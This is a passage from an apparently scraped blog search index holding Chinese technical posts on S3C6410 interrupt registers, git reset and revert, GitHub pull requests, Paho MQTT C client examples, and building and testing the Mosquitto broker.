在S3C6410中，还可以采用简化的中断处理流程。由CPU直接去调用中断的ISR来处理。 这样中断处理软件的编写难度就大大下降了。 向量(vector) 异常处理函数或中断处理函数的地址都会按中断号的顺离顺序排列在一个连续的内存当中，从C语言的角度来看，可以看成是一个指针数组。数组又称为向量(Vector). 如果你熟悉S3C2440的中断处理机制，可以发现S3C6410大大简化的中断编程处理。 相对于S3C2440详细而丰富的关于中断的解释，S3C6410的dataSheet明显是赶工之作，关于中断只有短短的15页，大量内容还是寄存器表格。 因此以下大部分我从S3C6410的测试程序和Application Note反推出来的。并且重新用ADS写程序验证了。 S3C6410的中断主要改进是. 增加中断向量控制器，这样在S3C2440里需要用软件来跳转的中断处理机制，在S3C6410完全由硬件来跳转。你只要把ISR地址是存在连续向量寄存器空间，而不是象S3C2440自行分配空间自行管理。 换句话说，在S3C2440下是由CPU触发IRQ/FIQ异常，由异常处理函数里再查找相关中断寄存器来跳到指定的ISR，而可以全部由S3C6410的VIC硬件来自动处理。 这个大大简化中断处理编程。 另一个是外部中断加入滤波电路，这样原来需要软件去毛刺的地方均可以采用硬件来进行滤波了，这样大大简化外部中断处理。 S3C6410 中断操作S3C6410 中断号 64个中断按硬件分组分成VIC0, VIC1两个组，各组由一个相应寄存器来处理。 中断号为0-31是VIC0组 中断号为32-63是VIC1组 S3C6410中断操作很简单。 打开中断 VICxINTENABLE x为0,1,0-31中断使用VIC0INTENABLE,32-63中断使用VIC1INTENABLE.以下各寄存器均同，不再重复. 对应位为1表示这个中断可用,如0号中断有效，是VIC0INTENABLE的第0位为1 关闭一个中断 向VICxINTENCLEAR对应位置1表示关闭这个中断. 设置中断类型 设置某一个中断是IRQ还是FIQ,注意只有一个中断才能FIQ.设置对应位1表示设为FIQ模式。 设置S3C6410的向量地址（ISR地址） 注意在S3C6410自已从了各用32个地址连续的寄存器然成两个寄存器数组。首地址分别是0x71200100和0x71300100.你可以象指针数组一样来操作它们，数组的下标就是中断号,每个中断源对应自己的中断地址位，共64个中断源，所以是两个32*32的数组。 这样设置让开发者大大简单化ISR的向量组织。 设置中断优先级 这个也采用用32*2寄存器形成两个优先级数组。每一个寄存器对应优先级别，取值范围在0-15之间. 中断运行后指示 这个因为了用VIC，现在省掉了S3C2440一大堆的SRCPND,INTPND,INTOFFSET,SUBSRCPND等寄存器。直接由VICxADDRESS来指示当前的ISR地址。 注意这个VICxADDRESS的寄存器，在S3C6410里称为在System BUS.调用。这种方式不建议调用,因为这种模式相当于S3C2440的用软件进行ISR跳转. 这三星的给的参考流程。 更为简单的调用方式.是VIC port 模式，是我强烈推荐的模式，它是系统产生中断后，将由VIC直接去执行相应的ISR。这不仅上编程变成简单，而且效率上更快，因为它没有访问VICxADDRESS和在System BUS执行的时间使用这种模式，只需要在启动加上特定的代码 外部中断编程 除INT_EINT0-INT_EINT4以外，全部中断是由S3C6410内部的模块触发的。称为内部中断 INT_EINT0-INT_EINT4是外部中断，是由CPU外的外设来触发的，它的触发哪一个中断取决外设联接哪一个GPIO中断脚。 象开发板的网络控制器,按钮等都是挂在某一些GPIO脚上。它们都是使用典形外部中断. 外部中断脚S3C6410 分9组GPIO脚来充当外部中断脚 第0组,共28脚.GPN0-GPN15 (16脚),GPL8-GPL14(7脚),GPM0-GPM4 (5脚) 第1组,由GPA0-GPA7,8个中断脚，GPB0-GPB7,8个中断脚 第2组,由GPC0-GPC0,共8个中断脚… … 第8组,由GPP0-GPP14,共15个中断脚 第9组,由GPQ0-GPQ8,共9个中断脚 外部中断号 第0组的第0脚到第3脚的设备将触INT_EINT0=0中断第0组的第4-11脚将触发INT_EINT1=1中断第0组的第12-19脚将触发INT_EINT2=32中断第0组的第20-27脚将触发INT_EINT3=33中断第1组-第9组所有设备只触发INT_EINT4=53中断 我们可以看到，每一个组都是多个中断脚共享一个中断号的。其中第0组比较常用，占用了3个中断号，每个管脚都有各自的子中断。1-9组共享一个中断号，每一组一个子中断源。 在ISR中，如何判断是哪一个中断脚的产生中断？ 不同的IO脚上多个设备产生同一个中断，软件如何知道是哪一个脚？由External Interrupt Pending Register 来判断 第0组由EINT0PEND来判断，脚位对应可以参考上图，不是很规整。 第1，2组由EINT12PEND来判断 依此类推，EINT34PEND，EINT56PEND， 一直到EINT9PEND 来指示 外部中断信号类型 这里设置中断产生何种信号才会被捕获。主要是五种，低电平，高电平，上升沿，下降沿或者两者均可，第0组用 EINT0CON0/EINT0CON1两个寄存器来设定. 第1，2组采用 EINT12CON ,第3,4组采用EINT34CON,依此类推 临时关闭外部中断EINTxMask是临时性关闭中断为1表示关闭某一个中断,为表示打开0,一般只要需要使用中断才会打开。 EINT0MASK是第0组的使用 EINT12MASK是第1,2组的中断掩码 依次类推… 定义硬件滤波类型 对于一些波形不规整的外部中断信号，可以通过滤波电路让其变成规整，这样会简化软件的编写. S3C6410有两种滤波电路，一种延时滤波（如按钮类中断可以采用这一类型）,一种是数字采样滤波.第二种滤波电路还要设采样宽度。 第0组的滤波用EINT0FLTCON0，EINT0FLTCON1， EINT0FLTCON2， EINT0FLTCON3配置. FLTEN表示是否打开滤波功能,FLTSEL是设置滤波方式，EINTn表示数字滤波采校的宽度 第1,2组的滤波采用 EINT12FLTCON第3,4组的滤波采用 EINT34FLTCON 第9组滤波 采用EINT9FLTCON 外部中断编程 外部中断除了中断编程所有流程外， 一般额外配置相应的GPxCON配置成中断脚。 还要配置滤波方式和中断信号方式。 还要打开外部中断掩码 在ISR中，在最后除了要把VICxADDRESS清0外，还需要清除 VICxSOFTINTCLEAR相应位。 软件中断编程 在S3C6410有64个软中断(与硬件中断对应）,这一段描述是非常含糊。是同一硬件中断可以用软件触发还是是，有一个完全对应的软件中断？这个需要软件来验证. 软中断除硬件中断的所有流程还要加上如下两条. 用VICxSOFTINT来触发软中断 ISR退出时使用VICxSOFTINTCLEAR清除状态软中断编程流程","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"git reset revert 回退回滚取消提交返回上一版本","slug":"SYSTEM/git reset revert 回退回滚取消提交返回上一版本","date":"2017-07-18T10:30:39.000Z","updated":"2017-08-09T03:52:47.663Z","comments":true,"path":"SYSTEM/git reset revert 回退回滚取消提交返回上一版本.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/git reset revert 回退回滚取消提交返回上一版本.html","excerpt":"总有一天你会遇到下面的问题. (1)改完代码匆忙提交,上线发现有问题,怎么办? 赶紧回滚. (2)改完代码测试也没有问题,但是上线发现你的修改影响了之前运行正常的代码报错,必须回滚. 这些开发中很常见的问题,所以git的取消提交,回退甚至返回上一版本","text":"总有一天你会遇到下面的问题. (1)改完代码匆忙提交,上线发现有问题,怎么办? 赶紧回滚. (2)改完代码测试也没有问题,但是上线发现你的修改影响了之前运行正常的代码报错,必须回滚. 这些开发中很常见的问题,所以git的取消提交,回退甚至返回上一版本都是特别重要的. 大致分为下面2种情况: 1.没有push 这种情况发生在你的本地代码仓库,可能你add ,commit 以后发现代码有点问题,准备取消提交,用到下面命令 resetgit reset [–soft | –mixed | –hard 上面常见三种类型 –mixed 会保留源码,只是将git commit和index 信息回退到了某个版本. git reset 默认是 –mixed 模式git reset –mixed 等价于 git reset –soft 保留源码,只回退到commit 信息到某个版本.不涉及index的回退,如果还需要提交,直接commit即可. –hard 源码也会回退到某个版本,commit和index 都回回退到某个版本.(注意,这种方式是改变本地代码仓库源码) 当然有人在push代码以后,也使用 reset –hard 回退代码到某个版本之前,但是这样会有一个问题,你线上的代码没有变,线上commit,index都没有变,当你把本地代码修改完提交的时候你会发现权是冲突….. 所以,这种情况你要使用下面的方式 2.已经push 对于已经把代码push到线上仓库,你回退本地代码其实也想同时回退线上代码,回滚到某个指定的版本,线上,线下代码保持一致.你要用到下面的命令 revert git revert用于反转提交,执行evert命令时要求工作树必须是干净的. git revert用一个新提交来消除一个历史提交所做的任何修改. revert 之后你的本地代码会回滚到指定的历史版本,这时你再 git push 既可以把线上的代码更新.(这里不会像reset造成冲突的问题) revert 使用,需要先找到你想回滚版本唯一的commit标识代码,可以用 git log 或者在adgit搭建的web环境历史提交记录里查看. git revert c011eb3c20ba6fb38cc94fe5a8dda366a3990c61 通常,前几位即可 git revert c011eb3 git revert是用一次新的commit来回滚之前的commit，git reset是直接删除指定的commit 看似达到的效果是一样的,其实完全不同. 第一: 上面我们说的如果你已经push到线上代码库, reset 删除指定commit以后,你git push可能导致一大堆冲突.但是revert 并不会. 第二: 如果在日后现有分支和历史分支需要合并的时候,reset 恢复部分的代码依然会出现在历史分支里.但是revert 方向提交的commit 并不会出现在历史分支里. 第三: reset 是在正常的commit历史中,删除了指定的commit,这时 HEAD 是向后移动了,而 revert 是在正常的commit历史中再commit一次,只不过是反向提交,他的 HEAD 是一直向前的.","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"Github上怎么修改别人的项目并且提交给原作者！图文并茂！","slug":"SYSTEM/Github上怎么修改别人的项目并且提交给原作者！图文并茂！","date":"2017-07-18T09:45:36.000Z","updated":"2017-07-18T09:49:16.241Z","comments":true,"path":"SYSTEM/Github上怎么修改别人的项目并且提交给原作者！图文并茂！.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/Github上怎么修改别人的项目并且提交给原作者！图文并茂！.html","excerpt":"Github上怎么修改别人的项目并且提交给原作者！图文并茂！ 写这篇博客的初衷，是因为我的项目Only需要一些朋友一起参与进来，但是很多的Git都不是很熟练，其实版本控制这种东西没有什么难度的，只要稍微掌握以下就好了，如果有兴趣的话也可以到Only这","text":"Github上怎么修改别人的项目并且提交给原作者！图文并茂！ 写这篇博客的初衷，是因为我的项目Only需要一些朋友一起参与进来，但是很多的Git都不是很熟练，其实版本控制这种东西没有什么难度的，只要稍微掌握以下就好了，如果有兴趣的话也可以到Only这个项目进来 Only:https://github.com/LiuGuiLinAndroid/Only 好的，不多说，直接开车了，我们先简单的找一个项目，比如这个项目，我需要更改他的内容，我们就直接fork这个项目 紧接着你就可以看到这个项目已经被你fork了 现在我们就可以直接clone下我们自己的项目来了 git clone xxxx 我们clone下来之后就可以更改了，这里我就在说明文件里加一句话：到此一游就好了，紧接着，我们提交 到这里，我们就可以在Github上看到我们自己的更新了 然后我们点击项目上的Pull request去请求 在这里写上我们的更新日志和更改了什么东西，然后点击Create pull request 到这里，就没有我们什么事了，我们只要等待作者收到邮件同意我们的更新就好了，那作者哪里做了什么呢？ 当他收到这个请求就会看到 只要点击同意，我们的提交就合并到他的代码里去了，就可以看到提交信息了 这个时候你的代码就静静的躺在作者的Github里了","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"MQTT C Client实现消息推送（入门指南）","slug":"EMBEDDED/MQTT C Client实现消息推送（入门指南）","date":"2017-07-14T07:20:41.000Z","updated":"2017-07-14T07:25:43.695Z","comments":true,"path":"EMBEDDED/MQTT C Client实现消息推送（入门指南）.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/MQTT C Client实现消息推送（入门指南）.html","excerpt":"本篇文章主要介绍了”MQTT C Client实现消息推送（入门指南）”，主要涉及到MQTT C Client实现消息推送（入门指南）方面的内容，对于MQTT C Client实现消息推送（入门指南）感兴趣的同学可以参考一下。 MQTT（Message","text":"本篇文章主要介绍了”MQTT C Client实现消息推送（入门指南）”，主要涉及到MQTT C Client实现消息推送（入门指南）方面的内容，对于MQTT C Client实现消息推送（入门指南）感兴趣的同学可以参考一下。 MQTT（Message Queuing Telemetry Transport，消息队列遥测传输）是IBM开发的一个即时通讯协议，通过MQTT协议，目前已经扩展出了数十个MQTT服务器端程序，可以通过PHP，JAVA，Python，C，C#等系统语言来向MQTT发送相关消息。随着移动互联网的发展，MQTT由于开放源代码，耗电量小等特点，将会在移动消息推送领域会有更多的贡献，在物联网领域，传感器与服务器的通信，信息的收集，MQTT都可以作为考虑的方案之一。在未来MQTT会进入到我们生活的各各方面。The Paho MQTT C Client is a fully fledged MQTT client written in ANSI standard C. It avoids C++ in order to be as portable as possible. A C++ layer over this library is also available in Paho. 目录： 何为MQTT 生成dll库混合编程 MQTT C Client实战 Synchronous publication example Asynchronous publication example Asynchronous subscription example 何为MQTT？MQTT主要用于服务端对客户端进行消息推送，根据这个具体要求，很容易知道它包括两个部分：客户端、服务端。 MQTT消息推送是基于主题topic模式的，可以分开来说： 客户端发布一条消息时，必须指定消息主题。（如，topic=”天气”,payload=”北京今天雾霾好大啊~~呜呜”），其中topic就是主题，payload是发送的具体内容。 服务端推送消息，也是基于主题的。当服务器发现有主题（如，topic=“天气”）时，就会给所有订阅该主题的客户端推送payload内容。 这里需要个前提，就是有客户端订阅topic=”天气”这个主题； 一旦客户端订阅该主题，服务端就会每收到该主题的消息，都会推送给订阅该主题的客户端。如果客户端不需要关注该主题了，也就是说不想接受到这样的推送消息了，只要取消otpic=”天气”的主题订阅即可。 MQTT协议是为大量计算能力有限，且工作在低带宽、不可靠的网络的远程传感器和控制设备通讯而设计的协议，它具有以下主要的几项特性： 使用发布/订阅消息模式，提供一对多的消息发布，解除应用程序耦合； 对负载内容屏蔽的消息传输； 使用 TCP/IP 提供网络连接； 有三种消息发布服务质量： “至多一次”，消息发布完全依赖底层 TCP/IP 网络。会发生消息丢失或重复。这一级别可用于如下情况，环境传感器数据，丢失一次读记录无所谓，因为不久后还会有第二次发送。 “至少一次”，确保消息到达，但消息重复可能会发生。 “只有一次”，确保消息到达一次。这一级别可用于如下情况，在计费系统中，消息重复或丢失会导致不正确的结果。（在实际编程中，只需要设置QoS值即可实现以上几种不同消息发布服务质量模式） 小型传输，开销很小（固定长度的头部是 2 字节），协议交换最小化，以降低网络流量； 使用 Last Will 和 Testament 特性通知有关各方客户端异常中断的机制； 生成dll库？混合编程？在开始开发之前需要做一些准备工作，MQTT已经把所有的APIs封装好了，我们可以使用它的dll库，也可以直接导入源码进行混合编程，一般要求不高的话（因为不太懂得话，最好不要修改源码）可以直接将源码生成dll，然后使用即可，下文就是使用该方式： git clone https://github.com/eclipse/paho.mqtt.c.git 从这里获得C Client源码之后，可以直接使用VS打开（我是VS2013）： 对于上图的说明，下载源码后，打开将是以上界面，包括十来个工程，这里讲解几个： paho-mqtt3a ： 一般实际开发中就是使用这个，a表示的是异步消息推送（asynchronous）。 paho-mqtt3as ： as表示的是 异步+加密（asynchronous+OpenSSL）。 paho-mqtt3c ： c 表示的应该是同步（Synchronize），一般性能较差，是发送+等待模式。 paho-mqtt3cs ： 同上，增加了一个OpenSSL而已。 这里根据自身的需要选择不同的项目生成DLL即可，右击单个项目-&gt;生成。由于你电脑中可能没有OPenSSL环境，如果点击VS工具栏中的生成解决方案，十有八九会失败，因为它会生成所有项目的解决方案，其实你根本用不着这么多。 另外，上图中无法打开包括文件VersionInfo.h，你只需要在src文件夹中找到VersionInfo.h.in文件，去掉.in后缀-&gt;重新生成即可。 MQTT C Client实战了解更多可以阅读《MQTT C Client for Posix and Windows》一文，下面根据官网资料，摘录了几个C语言实现MQTT的小DEMO。 MQTT使用起来也十分容易，基本上就那四五个函数：MQTTClient_create（创建客户端）、MQTTClient_connect（连接服务端）、MQTTClient_publishMessage（客户端-&gt;服务端发送消息）、MQTTClient_subscribe（客户端订阅某个主题）等等。其中，很多异步回调函数，需要自己去实现，如， 1MQTTAsync_setCallbacks(mqtt-&gt;_client, mqtt-&gt;_client, connlost, msgarrvd, NULL); MQTTAsync_setCallbacks中， connlost函数指针，是当MQTT意外断开链接时会回调的函数，由自己实现； msgarrvd函数指针，是当服务器有消息推送回来时，客户端在此处接受服务端消息内容。 另外，就是一些函数执行是否成功的回调函数，C语言封装回调之后，就是这么写法，看起来有些变扭。有兴趣的可以看《浅谈C/C++回调函数（Callback）&amp; 函数指针》文章，再了解以下回调函数。 12mqtt-&gt;_conn_opts.onSuccess = onConnect;mqtt-&gt;_conn_opts.onFailure = onConnectFailure; 最后，不得不说的就是，MQTT有些发送或者是订阅的内容时（某些函数中），在编程最好将参数中传进来的值在内存中拷贝一份再操作，笔者当时开发时，就是因为这样的问题，折腾了较长时间，后来在wireshark中发现数据包中根本没有内容，才知道是由于函数参数是指针形式，直接在异步中使用可能会发生一些未知的错误。 Synchronous publication example12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;#include &quot;MQTTClient.h&quot;#define ADDRESS &quot;tcp://localhost:1883&quot;#define CLIENTID &quot;ExampleClientPub&quot;#define TOPIC &quot;MQTT Examples&quot;#define PAYLOAD &quot;Hello World!&quot;#define QOS 1#define TIMEOUT 10000Lint main(int argc, char* argv[])&#123; MQTTClient client; MQTTClient_connectOptions conn_opts = MQTTClient_connectOptions_initializer; MQTTClient_message pubmsg = MQTTClient_message_initializer; MQTTClient_deliveryToken token; int rc; MQTTClient_create(&amp;client, ADDRESS, CLIENTID, MQTTCLIENT_PERSISTENCE_NONE, NULL); conn_opts.keepAliveInterval = 20; conn_opts.cleansession = 1; if ((rc = MQTTClient_connect(client, &amp;conn_opts)) != MQTTCLIENT_SUCCESS) &#123; printf(&quot;Failed to connect, return code %d\\n&quot;, rc); exit(EXIT_FAILURE); &#125; pubmsg.payload = PAYLOAD; pubmsg.payloadlen = strlen(PAYLOAD); pubmsg.qos = QOS; pubmsg.retained = 0; MQTTClient_publishMessage(client, TOPIC, &amp;pubmsg, &amp;token); printf(&quot;Waiting for up to %d seconds for publication of %s\\n&quot; &quot;on topic %s for client with ClientID: %s\\n&quot;, (int)(TIMEOUT/1000), PAYLOAD, TOPIC, CLIENTID); rc = MQTTClient_waitForCompletion(client, token, TIMEOUT); printf(&quot;Message with delivery token %d delivered\\n&quot;, token); MQTTClient_disconnect(client, 10000); MQTTClient_destroy(&amp;client); return rc;&#125; Asynchronous publication example123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;#include &quot;MQTTClient.h&quot;#define ADDRESS &quot;tcp://localhost:1883&quot;#define CLIENTID &quot;ExampleClientPub&quot;#define TOPIC &quot;MQTT Examples&quot;#define PAYLOAD &quot;Hello World!&quot;#define QOS 1#define TIMEOUT 10000Lvolatile MQTTClient_deliveryToken deliveredtoken;void delivered(void *context, MQTTClient_deliveryToken dt)&#123; printf(&quot;Message with token value %d delivery confirmed\\n&quot;, dt); deliveredtoken = dt;&#125;int msgarrvd(void *context, char *topicName, int topicLen, MQTTClient_message *message)&#123; int i; char* payloadptr; printf(&quot;Message arrived\\n&quot;); printf(&quot; topic: %s\\n&quot;, topicName); printf(&quot; message: &quot;); payloadptr = message-&gt;payload; for(i=0; i&lt;message-&gt;payloadlen; i++) &#123; putchar(*payloadptr++); &#125; putchar(&apos;\\n&apos;); MQTTClient_freeMessage(&amp;message); MQTTClient_free(topicName); return 1;&#125;void connlost(void *context, char *cause)&#123; printf(&quot;\\nConnection lost\\n&quot;); printf(&quot; cause: %s\\n&quot;, cause);&#125;int main(int argc, char* argv[])&#123; MQTTClient client; MQTTClient_connectOptions conn_opts = MQTTClient_connectOptions_initializer; MQTTClient_message pubmsg = MQTTClient_message_initializer; MQTTClient_deliveryToken token; int rc; MQTTClient_create(&amp;client, ADDRESS, CLIENTID, MQTTCLIENT_PERSISTENCE_NONE, NULL); conn_opts.keepAliveInterval = 20; conn_opts.cleansession = 1; MQTTClient_setCallbacks(client, NULL, connlost, msgarrvd, delivered); if ((rc = MQTTClient_connect(client, &amp;conn_opts)) != MQTTCLIENT_SUCCESS) &#123; printf(&quot;Failed to connect, return code %d\\n&quot;, rc); exit(EXIT_FAILURE); &#125; pubmsg.payload = PAYLOAD; pubmsg.payloadlen = strlen(PAYLOAD); pubmsg.qos = QOS; pubmsg.retained = 0; deliveredtoken = 0; MQTTClient_publishMessage(client, TOPIC, &amp;pubmsg, &amp;token); printf(&quot;Waiting for publication of %s\\n&quot; &quot;on topic %s for client with ClientID: %s\\n&quot;, PAYLOAD, TOPIC, CLIENTID); while(deliveredtoken != token); MQTTClient_disconnect(client, 10000); MQTTClient_destroy(&amp;client); return rc;&#125; Asynchronous subscription example1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;#include &quot;MQTTClient.h&quot;#define ADDRESS &quot;tcp://localhost:1883&quot;#define CLIENTID &quot;ExampleClientSub&quot;#define TOPIC &quot;MQTT Examples&quot;#define PAYLOAD &quot;Hello World!&quot;#define QOS 1#define TIMEOUT 10000Lvolatile MQTTClient_deliveryToken deliveredtoken;void delivered(void *context, MQTTClient_deliveryToken dt)&#123; printf(&quot;Message with token value %d delivery confirmed\\n&quot;, dt); deliveredtoken = dt;&#125;int msgarrvd(void *context, char *topicName, int topicLen, MQTTClient_message *message)&#123; int i; char* payloadptr; printf(&quot;Message arrived\\n&quot;); printf(&quot; topic: %s\\n&quot;, topicName); printf(&quot; message: &quot;); payloadptr = message-&gt;payload; for(i=0; i&lt;message-&gt;payloadlen; i++) &#123; putchar(*payloadptr++); &#125; putchar(&apos;\\n&apos;); MQTTClient_freeMessage(&amp;message); MQTTClient_free(topicName); return 1;&#125;void connlost(void *context, char *cause)&#123; printf(&quot;\\nConnection lost\\n&quot;); printf(&quot; cause: %s\\n&quot;, cause);&#125;int main(int argc, char* argv[])&#123; MQTTClient client; MQTTClient_connectOptions conn_opts = MQTTClient_connectOptions_initializer; int rc; int ch; MQTTClient_create(&amp;client, ADDRESS, CLIENTID, MQTTCLIENT_PERSISTENCE_NONE, NULL); conn_opts.keepAliveInterval = 20; conn_opts.cleansession = 1; MQTTClient_setCallbacks(client, NULL, connlost, msgarrvd, delivered); if ((rc = MQTTClient_connect(client, &amp;conn_opts)) != MQTTCLIENT_SUCCESS) &#123; printf(&quot;Failed to connect, return code %d\\n&quot;, rc); exit(EXIT_FAILURE); &#125; printf(&quot;Subscribing to topic %s\\nfor client %s using QoS%d\\n\\n&quot; &quot;Press Q&lt;Enter&gt; to quit\\n\\n&quot;, TOPIC, CLIENTID, QOS); MQTTClient_subscribe(client, TOPIC, QOS); do &#123; ch = getchar(); &#125; while(ch!=&apos;Q&apos; &amp;&amp; ch != &apos;q&apos;); MQTTClient_disconnect(client, 10000); MQTTClient_destroy(&amp;client); return rc;&#125;","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"MQTT学习笔记——MQTT协议体验 Mosquitto安装和使用","slug":"EMBEDDED/MQTT学习笔记——MQTT协议体验 Mosquitto安装和使用","date":"2017-07-12T09:48:27.000Z","updated":"2017-07-12T09:49:51.623Z","comments":true,"path":"EMBEDDED/MQTT学习笔记——MQTT协议体验 Mosquitto安装和使用.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/MQTT学习笔记——MQTT协议体验 Mosquitto安装和使用.html","excerpt":"0 前言 [MQTT](http://mqtt.org/)是IBM开发的一个即时通讯协议。MQTT是面向M2M和物联网的连接协议，采用轻量级发布和订阅消息传输机制。[Mosquitto](http://mosquitto.org/)是一款实现了 MQTT","text":"0 前言 [MQTT](http://mqtt.org/)是IBM开发的一个即时通讯协议。MQTT是面向M2M和物联网的连接协议，采用轻量级发布和订阅消息传输机制。[Mosquitto](http://mosquitto.org/)是一款实现了 MQTT v3.1 协议的开源消息代理软件，提供轻量级的，支持发布/订阅的的消息推送模式，使设备对设备之间的短消息通信简单易用。 若初次接触MQTT协议，可先理解以下概念： 【MQTT协议特点】——相比于RESTful架构的物联网系统，MQTT协议借助消息推送功能，可以更好地实现远程控制。 【MQTT协议角色】——在RESTful架构的物联网系统，包含两个角色客户端和服务器端，而在MQTT协议中包括发布者，代理器（服务器）和订阅者。 【MQTT协议消息】——MQTT中的消息可理解为发布者和订阅者交换的内容（负载），这些消息包含具体的内容，可以被订阅者使用。 【MQTT协议主题】——MQTT中的主题可理解为相同类型或相似类型的消息集合。 1 安装和使用注意点 1.1 安装 截止2015年12月，最新版本为mosquitto-1.4.5 下载源代码包 wget http://mosquitto.org/files/source/mosquitto-1.4.5.tar.gz 解压 tar zxfv mosquitto-1.4.5.tar.gz 进入目录 cd mosquitto-1.4.5 编译 make 安装 sudo make install 1.2 安装注意点 【1】编译找不到openssl/ssl.h 【解决方法】——安装openssl sudo apt-get install libssl-dev 【2】编译过程找不到ares.h sudo apt-get install libc-ares-dev 【3】编译过程找不到uuid/uuid.h sudo apt-get install uuid-dev 【4】使用过程中找不到libmosquitto.so.1 error while loading shared libraries: libmosquitto.so.1: cannot open shared object file: No such file or directory 【解决方法】——修改libmosquitto.so位置 创建链接 sudo ln -s /usr/local/lib/libmosquitto.so.1 /usr/lib/libmosquitto.so.1 更新动态链接库 sudo ldconfig 【5】make: g++：命令未找到 【解决方法】 安装g++编译器 sudo apt-get install g++ 2 简单测试 一个完整的MQTT示例包括一个代理器，一个发布者和一个订阅者。测试分为以下几个步骤： 【1】启动服务mosquitto。 【2】订阅者通过mosquitto_sub订阅指定主题的消息。 【3】发布者通过mosquitto_pub发布指定主题的消息。 【4】代理服务器把该主题的消息推送到订阅者。 【测试说明】 测试环境：ubuntu 14.04 虚拟机 在本例中，发布者、代理和订阅者均为localhsot，但是在实际的情况下三种并不是同一个设备，在mosquitto中可通过-h(--host)设置主机名称(hostname)。为了实现这个简单的测试案例，需要在linux中打开三个控制台，分别代表代理服务器、发布者和订阅者。 图1 示例 2.1 启动代理服务 mosquitto -v 【-v】打印更多的调试信息 2.2 订阅主题 mosquitto_sub -v -t sensor 【-t】指定主题，此处为sensor 【-v】打印更多的调试信息 2.3 发布内容 mosquitto_pub -t sensor -m 12 【-t】指定主题 【-m】指定消息内容 2.4 运行结果 当发布者推送消息之后，订阅者获得以下内容 sensor 12 而代理服务器控制台中会出现——连接、消息发布和心跳等调试信息。通过代理服务器的调试输出可以对MQTT协议的相关过程有所了解。 图2 代理服务器调试输出 3 总结 通过[Mosquitto](http://mosquitto.org/)实现MQTT协议代理器(服务器)，为今后的MQTT协议应用做准备。本文并没有分析MQTT协议的种种细节，但是希望通过一个简单的例子把MQTT协议“使用起来”，通过使用过程来理解MQTT协议，在过程中关注细节收集疑问，再阅读MQTT协议具体内容，这样学习起来就不至于枯燥乏味（即使MQTT协议只有40多页，但是初次阅读我还是没能理解其内涵，只能怪自己智商太低，学术不精。） 4 参考资料 【1】Mosquitto简要教程（安装/使用/测试） 【2】解决编译过程中找不到ares.h的问题 【3】解决使用过程中找不到libmosquitto.so.1的问题","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"mqtt的c语言客户端库和实例使用","slug":"EMBEDDED/mqtt的c语言客户端库和实例使用","date":"2017-07-12T08:36:17.000Z","updated":"2017-07-12T09:26:10.688Z","comments":true,"path":"EMBEDDED/mqtt的c语言客户端库和实例使用.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/mqtt的c语言客户端库和实例使用.html","excerpt":"C 客户端 Eclipse Paho C 1. 支持 TCP/SSL Socket 连接 2. 支持自动重连 3. 支持 WebSocket 4. 代码样例 123456789101112131415161718192021222324252","text":"C 客户端 Eclipse Paho C 支持 TCP/SSL Socket 连接 支持自动重连 支持 WebSocket 代码样例 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;#include &quot;MQTTClient.h&quot;#define ADDRESS &quot;tcp://localhost:1883&quot;#define CLIENTID &quot;ExampleClientPub&quot;#define TOPIC &quot;MQTT Examples&quot;#define PAYLOAD &quot;Hello World!&quot;#define QOS 1#define TIMEOUT 10000Lint main(int argc, char* argv[])&#123; MQTTClient client; MQTTClient_connectOptions conn_opts = MQTTClient_connectOptions_initializer; MQTTClient_message pubmsg = MQTTClient_message_initializer; MQTTClient_deliveryToken token; int rc; MQTTClient_create(&amp;client, ADDRESS, CLIENTID, MQTTCLIENT_PERSISTENCE_NONE, NULL); conn_opts.keepAliveInterval = 20; conn_opts.cleansession = 1; if ((rc = MQTTClient_connect(client, &amp;conn_opts)) != MQTTCLIENT_SUCCESS) &#123; printf(&quot;Failed to connect, return code %d\\n&quot;, rc); exit(-1); &#125; pubmsg.payload = PAYLOAD; pubmsg.payloadlen = strlen(PAYLOAD); pubmsg.qos = QOS; pubmsg.retained = 0; MQTTClient_publishMessage(client, TOPIC, &amp;pubmsg, &amp;token); printf(&quot;Waiting for up to %d seconds for publication of %s\\n&quot; &quot;on topic %s for client with ClientID: %s\\n&quot;, (int)(TIMEOUT/1000), PAYLOAD, TOPIC, CLIENTID); rc = MQTTClient_waitForCompletion(client, token, TIMEOUT); printf(&quot;Message with delivery token %d delivered\\n&quot;, token); MQTTClient_disconnect(client, 10000); MQTTClient_destroy(&amp;client); return rc;&#125; mqttc 1.支持消息发布、主题订阅以及取消订阅2.代码样例 1mqttc -h host -p port -u username -P password -k keepalive Eclipse Paho Embedded C 1.支持 MQTT V3.1 以及 V3.1.1 协议2.支持 TCP/SSL Socket 连接3.代码样例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#define MQTTCLIENT_QOS2 1#include &quot;MQTTClient.h&quot;#define DEFAULT_STACK_SIZE -1#include &quot;linux.cpp&quot;int arrivedcount = 0;void messageArrived(MQTT::MessageData&amp; md)&#123; MQTT::Message &amp;message = md.message; printf(&quot;Message %d arrived: qos %d, retained %d, dup %d, packetid %d\\n&quot;, ++arrivedcount, message.qos, message.retained, message.dup, message.id); 